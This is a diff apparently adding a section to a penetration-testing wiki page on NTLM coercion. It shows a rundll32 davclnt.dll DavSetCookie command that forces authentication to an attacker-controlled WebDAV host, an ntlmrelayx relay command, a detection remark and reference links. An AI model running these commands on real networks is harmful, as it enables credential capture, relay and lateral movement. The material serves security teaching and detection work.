@@ -159,6 +159,31 @@ If `TargetUnicode` resolves to a UNC path (e.g., `\\attacker\share\icon.ico`), *
 Research tooling (parser/generator/UI) is available in the **LnkMeMaybe** project to build/inspect these structures without using the Windows GUI.
 
 
+### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`
+
+The native **WebDAV client** can be abused to force the current logon session to authenticate to an arbitrary **HTTP/WebDAV** endpoint:
+
+```cmd
+rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
+```
+
+Why this is useful:
+- Against an **attacker-controlled WebDAV server**, it can trigger **NTLM over HTTP** without dropping a custom client.
+- Against **internal hosts**, it is a quiet way to **validate where stolen credentials are accepted** before moving laterally.
+- The command is a good alternative when **SMB egress is filtered** but **HTTP/WebDAV** is still reachable.
+
+Operational notes:
+- The **WebClient** service must be running on the source host.
+- `rundll32.exe` loads `davclnt.dll` and makes Windows handle the WebDAV authentication using the **current user's credentials**.
+- If you point it to infrastructure you control, use an NTLM-aware HTTP listener/relay such as:
+
+```bash
+# Capture or relay NTLM over HTTP/WebDAV
+ntlmrelayx.py -t smb://<TARGET> --http-port 80
+```
+
+From a detection perspective, repeated `rundll32.exe davclnt.dll,DavSetCookie` executions against many internal systems are a strong signal of **credential validation / spray-like lateral movement prep** rather than normal user behaviour.
+
 ### Office remote template injection (.docx/.dotm) to coerce NTLM
 
 Office documents can reference an external template. If you set the attached template to a UNC path, opening the document will authenticate to SMB.
@@ -195,6 +220,9 @@ README.md
 - [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
 - [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
 - [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
+- [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
+- [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
+- [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
 
 
 {{#include ../../banners/hacktricks-training.md}}
